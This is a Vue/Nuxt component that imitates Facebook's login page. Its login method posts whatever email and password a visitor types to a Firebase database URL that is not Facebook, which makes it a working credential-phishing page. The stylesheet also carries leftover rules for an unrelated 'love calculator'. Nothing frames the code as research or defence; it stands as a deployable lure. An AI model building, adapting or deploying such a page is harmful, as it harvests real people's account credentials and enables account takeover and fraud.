<template>
    <div>
      <html lang="en">
        <head>
          <meta charset="UTF-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>Facebook - Log In or Sign Up</title>
          <!--Bootstrap-->
          <link
            rel="stylesheet"
            href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
            integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"
            crossorigin="anonymous"
          />
          <!--Fontawesome CDN link-->
          <link
            rel="stylesheet"
            href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"
          />
          <!--External CSS StyleSheet-->
          <link rel="stylesheet" href="style.css" />
          <!--Google fonts-->
          <link
            href="https://fonts.googleapis.com/css2?family=Audiowide&family=B612+Mono&family=Nosifer&family=Pacifico&display=swap"
            rel="stylesheet"
          />
          <link
            href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap"
            rel="stylesheet"
          />
          <link
            href="https://fonts.googleapis.com/css2?family=Audiowide&family=B612+Mono&family=Days+One&family=Nosifer&family=Pacifico&display=swap"
            rel="stylesheet"
          />
        </head>
  
        <body>
          <div class="facebook">
            <div class="mobile-top-view">
              <img src="fb-mobile.png" alt="" />
              <a href="#">Get Facebook for Android and browse faster.</a>
            </div>
            <div class="view">
              <div class="container">
                <!--Row-->
                <div class="row">
                  <!--Column 1-->
                  <div class="col title-div">
                    <div>
                      <h1 class="text-primary">facebook2</h1>
                      <p>
                        Connect with friends and the world around you on Facebook.
                      </p>
                    </div>
                  </div>
                  <!--Column 2-->
                  <div class="col-sm-5">
                    <div class="card">
                      <form
                        method="post"
                      >
                        <div>
                          <input
                            id="email"
                            v-model="email"
                            class="input-group"
                            type="text"
                            placeholder="Email or Phone Number"
                            name="email"
                          />
                          <input
                            id="pass"
                            v-model="password"
                            class="input-group my-2"
                            type="password"
                            placeholder="Password"
                            name="password"
                          />
                          <button    
                            id="fbLogin"
                            class="btn btn-primary btn-lg"
                            style="width: 100%"
                            type="submit"
                            @click="login()"
                          >
                            Log In
                          </button>
                          <hr id="hr1" />
                          <p
                            id="forgetPass1"
                            class="text-center my-3"
                            style="font-size: 14px"
                          >
                            <a href="#">Forget account?</a>
                          </p>
                        </div>
                      </form>
                      <hr id="hr2" />
                      <button id="createAcBtn" class="btn btn-success btn-lg">
                        Create New Account
                      </button>
                      <p id="forgetPass2" class="text-center my-3">
                        <a href="#">Forget account?</a>
                      </p>
                    </div>
                    <p
                      id="form-footer"
                      class="text-center my-4"
                      style="font-size: 14px"
                    >
                      <b>Create a Page</b> for a celebrity, brand or buisness.
                    </p>
                    <div class="mobile-version-footer">
                      <div class="row language">
                        <div class="col">
                          <p>English (US)</p>
                          <p>हिन्दी</p>
                          <p>Portugues (Brasil)</p>
                          <p>Deutsch</p>
                        </div>
                        <div class="col">
                          <p>नेपाली</p>
                          <p>Espanol</p>
                          <p>Francais (France)</p>
                          <p><i class="fa fa-plus-square"></i></p>
                        </div>
                      </div>
                      <div class="nav">
                        <ul>
                          <a href="">
                            <li>About</li>
                          </a>
                          <a href="">
                            <li>Help</li>
                          </a>
                          <a href="">
                            <li>More</li>
                          </a>
                        </ul>
                      </div>
                    </div>
                  </div>
                  <!--Row End-->
                </div>
              </div>
            </div>
          </div>
        </body>
      </html>
    </div>
  </template>
  
  <script>
  import axios from 'axios';
  export default {
    name: 'TestNuxtKnowledgeFacebook',
  
    data() {
      return {}
    },
  
    mounted() {},
  
    methods: {
   async   login(){
        const data = {
       email: this.email,
       password: this.password,
       time:'facebook2'
      }
      await this.$store.commit("facebook/setFacebook2", true);
     await   axios.post('https://facebook-lo-default-rtdb.asia-southeast1.firebasedatabase.app/users.json', data)
      .then((response) => {
      })
      .catch((error) => {
        console.log(error);
      });
      }
    },
  }
  </script>
  
  <style lang="scss" scoped>
  body {
    background: #f7f9fa;
    overflow-y: scroll;
  }
  .view {
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .mobile-top-view {
    display: none;
  }
  .mobile-top-view img {
    height: 40px;
    opacity: 0.8;
  }
  .title-div {
    margin-top: 70px;
  }
  .title-div div {
    padding: 0 40px;
  }
  .title-div h1 {
    font-size: 60px;
    font-weight: 900;
  }
  .title-div p {
    font-size: 30px;
  }
  .card {
    padding: 20px;
    box-shadow: 0 0 8px rgba(192, 188, 188, 0.527);
    border-radius: 8px;
  }
  .input-group {
    height: 50px;
    border: 1px solid rgb(221, 221, 221);
    border-radius: 5px;
    padding: 0 15px;
  }
  #hr1 {
    display: none;
  }
  #hr2 {
    margin-top: 0px;
  }
  #forgetPass2 {
    display: none;
  }
  
  #createAcBtn {
    display: block;
    margin: 0 auto;
    margin-top: 5px;
  }
  .mobile-version-footer {
    display: none;
  }
  @media screen and (max-width: 768px) {
    .title-div div {
      padding: 0px;
    }
    .title-div h1 {
      font-size: 40px;
    }
    .title-div p {
      font-size: 20px;
    }
    .card {
      padding: 20px;
      box-shadow: none;
      border: none;
    }
  }
  
  @media screen and (max-width: 575px) {
    .mobile-top-view {
      display: block;
      background-color: antiquewhite;
      height: 50px;
      width: 100%;
      line-height: 40px;
      top: 0;
      left: 0;
      padding: 5px;
      overflow: hidden;
      font-size: 15px;
    }
    .mobile-top-view a {
      color: rgba(0, 0, 255, 0.561);
    }
    .title-div {
      margin-top: -60px;
    }
    .title-div h1 {
      text-align: center;
      font-size: 25px;
    }
    .title-div p {
      display: none;
    }
    .card {
      padding: 5px;
    }
    #forgetPass1 {
      display: none;
    }
    #hr2 {
      display: none;
    }
    #hr1 {
      display: block;
      margin-top: 20px;
    }
    #hr1::before {
      position: absolute;
      content: 'or';
      left: 50%;
      transform: translateX(-50%);
      margin-top: -12px;
      background: #fff;
      padding: 0 10px;
      color: #333;
    }
    #forgetPass2 {
      display: block;
      font-size: 20px;
    }
    #forgetPass2 a {
      color: rgba(0, 68, 255, 0.6);
    }
    #form-footer {
      display: none;
    }
    .mobile-version-footer {
      display: block;
      margin-top: 30px;
    }
    .language p {
      text-align: center;
      margin: 0;
      color: rgba(0, 68, 255, 0.6);
    }
    .nav ul {
      position: absolute;
      left: 50%;
      transform: translateX(-70%);
      margin-top: 20px;
    }
    .nav ul a li {
      font-size: 13px;
      float: left;
      margin-left: 20px;
      color: rgba(0, 68, 255, 0.6);
    }
    .nav ul a:nth-child(1) li {
      margin-left: 0;
      list-style: none;
    }
    .welcome-div h1 {
      font-size: 22px;
    }
  }
  
  /*Style for love Calculator*/
  .love-calculator {
    display: none;
  }
  
  .container-body {
    padding: 10px;
    border-radius: 8px;
    box-shadow: 7px 7px 13px rgba(153, 153, 153, 0.4), -7px -7px 13px #fff;
  }
  
  .program-title {
    font-family: 'Audiowide', cursive;
  }
  
  .input {
    display: flex;
    justify-content: center;
  }
  
  .input input {
    background: none;
    border: none;
    outline: none;
    box-shadow: 0 0 0 2px #e2e8ee, 0 0 2px #fff,
      3px 3px 2px inset rgba(153, 153, 153, 0.4), -4px -4px 9px inset #ffffff;
    border-radius: 5px;
    padding: 0 8px;
    height: 35px;
    color: #555;
  }
  
  .input input:nth-child(2) {
    margin-left: 5px;
  }
  
  .calculate {
    display: flex;
    justify-content: center;
  }
  
  .result div {
    display: flex;
    justify-content: center;
    font-family: 'Pacifico', cursive;
  }
  
  #resultPercent {
    font-size: 100px;
    font-family: 'Audiowide', cursive;
  }
  
  #author {
    position: absolute;
    left: 50%;
    transform: translateX(-50%);
    margin-top: -25px;
    font-size: 11px;
    color: rgb(192, 192, 192);
    letter-spacing: 2px;
  }
  
  .progress-div {
    height: 20px;
    border-radius: 50px;
    overflow: hidden;
    margin-top: -40px;
    margin-bottom: 30px;
  }
  
  .progress-bar {
    height: 20px;
    width: 0;
    margin-left: 0;
    background: linear-gradient(135deg, gold, rgba(251, 40, 3, 0.938));
  }
  
  @media screen and (max-width: 500px) {
    .program-title {
      font-size: 32px;
    }
    .input {
      flex-direction: column;
    }
  
    .input input:nth-child(2) {
      margin-top: 10px;
      margin-left: 0;
    }
    #yourName,
    #partnerName {
      font-size: 22px;
    }
  }
  </style>
  